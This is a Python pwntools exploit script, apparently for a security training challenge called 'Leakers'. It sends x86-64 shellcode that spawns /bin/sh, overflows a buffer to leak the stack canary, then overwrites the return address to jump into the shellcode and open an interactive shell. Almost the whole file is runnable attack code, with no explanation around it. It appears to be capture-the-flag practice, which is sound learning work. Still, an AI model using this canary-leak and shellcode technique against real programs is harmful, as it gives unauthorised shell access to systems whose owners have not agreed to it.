from pwn import *
import binascii
# context.terminal = [ 'tmux', 'splitw' , '-h']
# context.terminal = ['terminator', '--new-tab', '-x']
context.log_level = 'debug'
HOST = "training.jinblack.it"
PORT = 2010
PROG = "./leakers"
if args.REMOTE:
    r = remote(HOST, PORT)
elif args.GDB:
    r = process(PROG)
    gdb.attach(r,"""
    b * 0x401255
    b*0x40122e
    b*0x404080
    """)
    input("wait for gdb")
else:
    r = process(PROG)

r.recvuntil("Welcome to Leakers!\n")
r.recvuntil("\n")

# payload =  cyclic(220)
payload = b"BBBB-"*1
shellcode = b"\x90"*10 + b"\x48\x31\xC0\x66\xB8\x3B\x00\x48\xBB\x2F\x62\x69\x6E\x2F\x73\x68\x00\x53\x48\x89\xE7\x48\x31\xDB\x53\x48\x89\xE6\x48\x89\xF2\x0F\x05\x90\x90\x90\x90"

# payload = payload.ljust(1000,b"\x90")
# payload = cyclic(1000)
input("send shellcode...")
r.send(shellcode)

payload = b"A"*105
input("send leaking string")
r.send(payload)

# print(r.recv(130))
canary = r.recv(150)[123:130] #empirically found lol
print("The canary is ", canary, "\b The len is....", len(canary))



# input("wait")
# input("send...")
# payload = b"C"*30
# # r.send(b"A"*8)
# r.send(payload)
# print(r.recv(130)[111:])
# canary = r.recv(140)[114:]

# print(canary, len(canary))

input("sending new RIP")
r.send(b"A"*104 + b"\x00"+ canary + b"Z"*8+ p64(0x00404084))


input("Sending ENTER")
r.send("\n")
r.interactive()
#0804c060
# mov rsi, rax
# xor rax, rax
# mov rdi, rax
# mov dx, 0xff
# syscall
